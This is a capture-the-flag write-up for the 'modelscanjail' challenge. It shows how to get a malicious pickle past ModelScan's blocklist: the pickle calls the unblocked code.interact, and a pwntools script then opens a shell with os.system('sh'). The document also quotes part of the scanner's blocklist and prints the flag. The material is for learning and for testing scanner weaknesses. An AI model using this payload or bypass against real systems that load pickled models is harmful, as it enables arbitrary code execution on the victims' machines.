# modelscanjail

```
why even try to blacklist python pickle ...

nc challs1.pyjail.club 16050
```

Attachment:

```python
#!/usr/local/bin/python3
import modelscan.settings
import modelscan.modelscan
import pickle

scan = modelscan.modelscan.ModelScan(settings=modelscan.settings.DEFAULT_SETTINGS)

open('/tmp/malicious.pkl', 'wb').write(bytes.fromhex(input('> '))[:23])

result = scan.scan('/tmp/malicious.pkl')
if result['issues'] or result['errors']:
    print(result)
    print('no')
    exit()

pickle.loads(open('/tmp/malicious.pkl', 'rb').read())
```

We need to create a malicious pickle under 23 bytes and passing modelscan validation. The validation is done in [picklescanner.py](https://github.com/protectai/modelscan/blob/main/modelscan/tools/picklescanner.py) and many functions are banned from [settings.py](https://github.com/protectai/modelscan/blob/main/modelscan/settings.py):

```python
"__builtin__": [
    "eval",
    "compile",
    "getattr",
    "apply",
    "exec",
    "open",
    "breakpoint",
    "__import__",
],
"os": "*",
# ... many more
```

However, inspired by [pull request #313](https://github.com/protectai/modelscan/pull/313), the list is incomplete. For example. `code.interact` is not banned. We can construct a pickle that calls it by:

1. `GLOBAL + b"code\ninteract\n"`: load global variable `interact` from `code` module onto the stack
2. `EMPTY_TUPLE`: push `()` onto the stack, it will be the arguments to `code.interact`
3. `REDUCE`: pop two elements from stack, the first is the argument tuple (empty tuple here), the second is the function itself (`code.interact` here), so it effectively calls `code.interact()`
4. `STOP`: make `pickletools.genops` happy, otherwise modelscan will complain

Attack script:

```python
from pwn import *
from pickle import *
import pickletools

context(log_level="debug")


def encode_str(s):
    b = s.encode()
    return bytes([len(b)]) + b


payload = GLOBAL + b"code\ninteract\n" + EMPTY_TUPLE + REDUCE + STOP  # call code.interact()
pickletools.dis(payload)
print(list(pickletools.genops(payload)))
assert len(payload) <= 23

# p = process(["python3", "main.py"])
p = remote("challs1.pyjail.club", 16050)
p.sendline(payload.hex().encode())
p.recvuntil(b">>>")
p.sendline(b"import os;os.system('sh')")
p.interactive()
```

Flag: `jail{they_really_dont_care_bruh_fdf1d09caee6d95c}`.
